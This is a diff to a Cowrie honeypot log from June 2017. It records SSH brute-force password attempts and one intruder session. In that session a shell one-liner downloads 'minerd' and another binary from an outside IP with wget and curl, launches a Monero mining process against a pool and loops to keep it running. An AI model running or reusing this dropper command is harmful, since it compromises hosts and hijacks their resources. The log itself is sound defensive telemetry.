@@ -7688,3 +7688,120 @@
 2017-06-05T06:24:59+0000 [CowrieTelnetTransport,16063,182.150.55.64] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
 	]
 2017-06-05T06:24:59+0000 [CowrieTelnetTransport,16063,182.150.55.64] Connection lost after 136 seconds
+2017-06-05T06:25:23+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 118.174.13.37:45628 (10.8.41.81:2222) [session: 110aafa3]
+2017-06-05T06:25:24+0000 [HoneyPotSSHTransport,5923,118.174.13.37] Remote SSH version: SSH-2.0-libssh-0.2
+2017-06-05T06:25:24+0000 [HoneyPotSSHTransport,5923,118.174.13.37] kex alg, key alg: 'ecdh-sha2-nistp256' 'ssh-rsa'
+2017-06-05T06:25:24+0000 [HoneyPotSSHTransport,5923,118.174.13.37] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-05T06:25:24+0000 [HoneyPotSSHTransport,5923,118.174.13.37] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-05T06:25:24+0000 [HoneyPotSSHTransport,5923,118.174.13.37] NEW KEYS
+2017-06-05T06:25:24+0000 [HoneyPotSSHTransport,5923,118.174.13.37] starting service 'ssh-userauth'
+2017-06-05T06:25:24+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5923,118.174.13.37] 'oracle' trying auth 'none'
+2017-06-05T06:25:26+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5923,118.174.13.37] 'oracle' authenticated with 'none'
+2017-06-05T06:25:26+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5923,118.174.13.37] starting service 'ssh-connection'
+2017-06-05T06:25:26+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,5923,118.174.13.37] got channel 'session' request
+2017-06-05T06:25:26+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,5923,118.174.13.37] channel open
+2017-06-05T06:25:26+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,5923,118.174.13.37] executing command "echo 1; killall 1; killall 5; killall 4; rm -f /var/tmp/.war/* ;unset plm; mkdir /var/tmp/.war;wget http://112.169.85.31/.../minerd -O /var/tmp/.war/1;curl -o /var/tmp/.war/1 http://112.169.85.31/.../minerd;chmod +x /var/tmp/.war/1 ; (exec /var/tmp/.war/1 -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u zaxa2aq@protonmail.com -p x &> /dev/null &);wget http://112.169.85.31/.../4 -O /var/tmp/.war/4;curl -o /var/tmp/.war/4 http://112.169.85.31/.../4;chmod +x /var/tmp/.war/4; cp /var/tmp/.war/4 /var/tmp/.war/6;(exec /var/tmp/.war/4 &> /dev/null &) ; (while [ 1 ]; do killall 4; killall 5 ; cp /var/tmp/.war/6 /var/tmp/.war/5;chmod +x /var/tmp/.war/5;(exec /var/tmp/.war/5 &> /dev/null &); sleep 3600 ;done &);"
+2017-06-05T06:25:26+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,5923,118.174.13.37] Opening TTY Log: log/tty/20170605-062526-110aafa3-0e.log
+2017-06-05T06:25:26+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,5923,118.174.13.37] CMD: echo 1; killall 1; killall 5; killall 4; rm -f /var/tmp/.war/* ;unset plm; mkdir /var/tmp/.war;wget http://112.169.85.31/.../minerd -O /var/tmp/.war/1;curl -o /var/tmp/.war/1 http://112.169.85.31/.../minerd;chmod +x /var/tmp/.war/1 ; (exec /var/tmp/.war/1 -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u zaxa2aq@protonmail.com -p x &> /dev/null &);wget http://112.169.85.31/.../4 -O /var/tmp/.war/4;curl -o /var/tmp/.war/4 http://112.169.85.31/.../4;chmod +x /var/tmp/.war/4; cp /var/tmp/.war/4 /var/tmp/.war/6;(exec /var/tmp/.war/4 &> /dev/null &) ; (while [ 1 ]; do killall 4; killall 5 ; cp /var/tmp/.war/6 /var/tmp/.war/5;chmod +x /var/tmp/.war/5;(exec /var/tmp/.war/5 &> /dev/null &); sleep 3600 ;done &);
+2017-06-05T06:25:26+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,5923,118.174.13.37] Command found: echo 1
+2017-06-05T06:25:26+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,5923,118.174.13.37] Command found: killall 1
+2017-06-05T06:25:26+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,5923,118.174.13.37] Reading txtcmd from "txtcmds/usr/bin/killall"
+2017-06-05T06:25:26+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,5923,118.174.13.37] Command found: killall 5
+2017-06-05T06:25:26+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,5923,118.174.13.37] Reading txtcmd from "txtcmds/usr/bin/killall"
+2017-06-05T06:25:26+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,5923,118.174.13.37] Command found: killall 4
+2017-06-05T06:25:26+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,5923,118.174.13.37] Reading txtcmd from "txtcmds/usr/bin/killall"
+2017-06-05T06:25:26+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,5923,118.174.13.37] Command found: rm -f /var/tmp/.war/*
+2017-06-05T06:25:26+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,5923,118.174.13.37] Command found: unset plm
+2017-06-05T06:25:26+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,5923,118.174.13.37] Command found: mkdir /var/tmp/.war
+2017-06-05T06:25:26+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,5923,118.174.13.37] Command found: wget http://112.169.85.31/.../minerd -O /var/tmp/.war/1
+2017-06-05T06:25:26+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://112.169.85.31/.../minerd>
+2017-06-05T06:25:26+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,5923,118.174.13.37] received eof, sending ctrl-d to command
+2017-06-05T06:25:30+0000 [HTTPPageDownloader,client] Not storing duplicate content 63210b24f42c05b2c5f8fd62e98dba6de45c7d751a2e55700d22983772886017
+2017-06-05T06:25:30+0000 [HTTPPageDownloader,client] Downloaded URL (http://112.169.85.31/.../minerd) with SHA-256 63210b24f42c05b2c5f8fd62e98dba6de45c7d751a2e55700d22983772886017 to dl/63210b24f42c05b2c5f8fd62e98dba6de45c7d751a2e55700d22983772886017
+2017-06-05T06:25:30+0000 [HTTPPageDownloader,client] Command found: curl -o /var/tmp/.war/1 http://112.169.85.31/.../minerd
+2017-06-05T06:25:30+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://112.169.85.31/.../minerd>
+2017-06-05T06:25:30+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://112.169.85.31/.../minerd>
+2017-06-05T06:25:34+0000 [HTTPPageDownloader,client] Not storing duplicate content 63210b24f42c05b2c5f8fd62e98dba6de45c7d751a2e55700d22983772886017
+2017-06-05T06:25:34+0000 [HTTPPageDownloader,client] Downloaded URL (http://112.169.85.31/.../minerd) with SHA-256 63210b24f42c05b2c5f8fd62e98dba6de45c7d751a2e55700d22983772886017 to dl/63210b24f42c05b2c5f8fd62e98dba6de45c7d751a2e55700d22983772886017
+2017-06-05T06:25:34+0000 [HTTPPageDownloader,client] Command found: chmod +x /var/tmp/.war/1
+2017-06-05T06:25:34+0000 [HTTPPageDownloader,client] Command not found: exec /var/tmp/.war/1 -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u zaxa2aq@protonmail.com -p x &> /dev/null &); wget http://112.169.85.31/.../4 -O /var/tmp/.war/4
+2017-06-05T06:25:34+0000 [HTTPPageDownloader,client] Command found: curl -o /var/tmp/.war/4 http://112.169.85.31/.../4
+2017-06-05T06:25:34+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://112.169.85.31/.../4>
+2017-06-05T06:25:34+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://112.169.85.31/.../minerd>
+2017-06-05T06:25:44+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 60.216.75.138:9224 (10.8.41.81:2222) [session: a9b205f8]
+2017-06-05T06:25:44+0000 [HoneyPotSSHTransport,5924,60.216.75.138] Remote SSH version: SSH-2.0-libssh2_1.7.0
+2017-06-05T06:25:44+0000 [HoneyPotSSHTransport,5924,60.216.75.138] kex alg, key alg: 'diffie-hellman-group-exchange-sha256' 'ssh-rsa'
+2017-06-05T06:25:44+0000 [HoneyPotSSHTransport,5924,60.216.75.138] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-05T06:25:44+0000 [HoneyPotSSHTransport,5924,60.216.75.138] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-05T06:25:45+0000 [HoneyPotSSHTransport,5924,60.216.75.138] NEW KEYS
+2017-06-05T06:25:45+0000 [HoneyPotSSHTransport,5924,60.216.75.138] starting service 'ssh-userauth'
+2017-06-05T06:25:46+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5924,60.216.75.138] 'root' trying auth 'password'
+2017-06-05T06:25:46+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5924,60.216.75.138] login attempt: 5
+2017-06-05T06:25:46+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5924,60.216.75.138] login return, expect: [root/supercrix]
+2017-06-05T06:25:48+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5924,60.216.75.138] login attempt [root/112233] failed
+2017-06-05T06:25:48+0000 [HoneyPotSSHTransport,5922,190.48.1.77] Remote SSH version: SSH-2.0-sshlib-0.1
+2017-06-05T06:25:48+0000 [HoneyPotSSHTransport,5922,190.48.1.77] kex alg, key alg: 'diffie-hellman-group1-sha1' 'ssh-dss'
+2017-06-05T06:25:48+0000 [HoneyPotSSHTransport,5922,190.48.1.77] outgoing: 'aes128-cbc' 'hmac-md5' 'none'
+2017-06-05T06:25:48+0000 [HoneyPotSSHTransport,5922,190.48.1.77] incoming: 'aes128-cbc' 'hmac-md5' 'none'
+2017-06-05T06:25:48+0000 [HoneyPotSSHTransport,5922,190.48.1.77] connection lost
+2017-06-05T06:25:48+0000 [HoneyPotSSHTransport,5922,190.48.1.77] Connection lost after 67 seconds
+2017-06-05T06:25:49+0000 [-] 'root' failed auth 'password'
+2017-06-05T06:25:49+0000 [-] unauthorized login: 
+2017-06-05T06:25:50+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5924,60.216.75.138] 'root' trying auth 'password'
+2017-06-05T06:25:50+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5924,60.216.75.138] login attempt: 6
+2017-06-05T06:25:50+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5924,60.216.75.138] login return, expect: [root/supercrix]
+2017-06-05T06:25:52+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5924,60.216.75.138] login attempt [root/idcidc] failed
+2017-06-05T06:25:52+0000 [HTTPPageDownloader,client] Not storing duplicate content 14e4aea4d8958a32e19ad64111d2d213fee0c6ad4a56a9966eee6aa61c156dba
+2017-06-05T06:25:52+0000 [HTTPPageDownloader,client] Downloaded URL (http://112.169.85.31/.../4) with SHA-256 14e4aea4d8958a32e19ad64111d2d213fee0c6ad4a56a9966eee6aa61c156dba to dl/14e4aea4d8958a32e19ad64111d2d213fee0c6ad4a56a9966eee6aa61c156dba
+2017-06-05T06:25:52+0000 [HTTPPageDownloader,client] Command found: chmod +x /var/tmp/.war/4
+2017-06-05T06:25:52+0000 [HTTPPageDownloader,client] Command found: cp /var/tmp/.war/4 /var/tmp/.war/6
+2017-06-05T06:25:52+0000 [HTTPPageDownloader,client] Command not found: exec /var/tmp/.war/4 &> /dev/null &
+2017-06-05T06:25:52+0000 [HTTPPageDownloader,client] Command not found: while [ 1 ]
+2017-06-05T06:25:52+0000 [HTTPPageDownloader,client] Command not found: do killall 4
+2017-06-05T06:25:52+0000 [HTTPPageDownloader,client] Command found: killall 5
+2017-06-05T06:25:52+0000 [HTTPPageDownloader,client] Reading txtcmd from "txtcmds/usr/bin/killall"
+2017-06-05T06:25:52+0000 [HTTPPageDownloader,client] Command found: cp /var/tmp/.war/6 /var/tmp/.war/5
+2017-06-05T06:25:52+0000 [HTTPPageDownloader,client] Command found: chmod +x /var/tmp/.war/5
+2017-06-05T06:25:52+0000 [HTTPPageDownloader,client] Command not found: exec /var/tmp/.war/5 &> /dev/null &); sleep 3600
+2017-06-05T06:25:52+0000 [HTTPPageDownloader,client] Command not found: done &);
+2017-06-05T06:25:52+0000 [HTTPPageDownloader,client] exitCode: 0
+2017-06-05T06:25:52+0000 [HTTPPageDownloader,client] sending request 'exit-status'
+2017-06-05T06:25:52+0000 [HTTPPageDownloader,client] Not storing duplicate content 14e4aea4d8958a32e19ad64111d2d213fee0c6ad4a56a9966eee6aa61c156dba
+2017-06-05T06:25:52+0000 [HTTPPageDownloader,client] Saved redir contents with SHA-256 14e4aea4d8958a32e19ad64111d2d213fee0c6ad4a56a9966eee6aa61c156dba to dl/14e4aea4d8958a32e19ad64111d2d213fee0c6ad4a56a9966eee6aa61c156dba
+2017-06-05T06:25:52+0000 [HTTPPageDownloader,client] Not storing duplicate content 63210b24f42c05b2c5f8fd62e98dba6de45c7d751a2e55700d22983772886017
+2017-06-05T06:25:52+0000 [HTTPPageDownloader,client] Saved redir contents with SHA-256 63210b24f42c05b2c5f8fd62e98dba6de45c7d751a2e55700d22983772886017 to dl/63210b24f42c05b2c5f8fd62e98dba6de45c7d751a2e55700d22983772886017
+2017-06-05T06:25:52+0000 [HTTPPageDownloader,client] Not storing duplicate content 63210b24f42c05b2c5f8fd62e98dba6de45c7d751a2e55700d22983772886017
+2017-06-05T06:25:52+0000 [HTTPPageDownloader,client] Saved redir contents with SHA-256 63210b24f42c05b2c5f8fd62e98dba6de45c7d751a2e55700d22983772886017 to dl/63210b24f42c05b2c5f8fd62e98dba6de45c7d751a2e55700d22983772886017
+2017-06-05T06:25:52+0000 [HTTPPageDownloader,client] Closing TTY Log: log/tty/20170605-062526-110aafa3-0e.log after 25 seconds
+2017-06-05T06:25:52+0000 [HTTPPageDownloader,client] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-06-05T06:25:52+0000 [HTTPPageDownloader,client] sending close 0
+2017-06-05T06:25:52+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://112.169.85.31/.../4>
+2017-06-05T06:25:52+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,5923,118.174.13.37] remote close
+2017-06-05T06:25:52+0000 [HoneyPotSSHTransport,5923,118.174.13.37] avatar oracle logging out
+2017-06-05T06:25:52+0000 [HoneyPotSSHTransport,5923,118.174.13.37] connection lost
+2017-06-05T06:25:52+0000 [HoneyPotSSHTransport,5923,118.174.13.37] Connection lost after 28 seconds
+2017-06-05T06:25:53+0000 [HoneyPotSSHTransport,5924,60.216.75.138] connection lost
+2017-06-05T06:25:53+0000 [HoneyPotSSHTransport,5924,60.216.75.138] Connection lost after 9 seconds
+2017-06-05T06:25:53+0000 [-] 'root' failed auth 'password'
+2017-06-05T06:25:53+0000 [-] unauthorized login: 
+2017-06-05T06:25:53+0000 [twisted.internet.defer#critical] Unhandled error in Deferred:
+2017-06-05T06:25:53+0000 [twisted.internet.defer#critical] 
+	Traceback (most recent call last):
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/base.py", line 1252, in mainLoop
+	    self.runUntilCurrent()
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/base.py", line 878, in runUntilCurrent
+	    call.func(*call.args, **call.kw)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/defer.py", line 459, in callback
+	    self._startRunCallbacks(result)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/defer.py", line 567, in _startRunCallbacks
+	    self._runCallbacks()
+	--- <exception caught here> ---
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/defer.py", line 653, in _runCallbacks
+	    current.result = callback(current.result, *args, **kw)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/conch/ssh/userauth.py", line 251, in _ebBadAuth
+	    NS(b','.join(self.supportedAuthentications)) + b'\x00')
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/conch/ssh/transport.py", line 637, in sendPacket
+	    self.transport.write(encPacket)
+	exceptions.AttributeError: 'NoneType' object has no attribute 'write'
+	
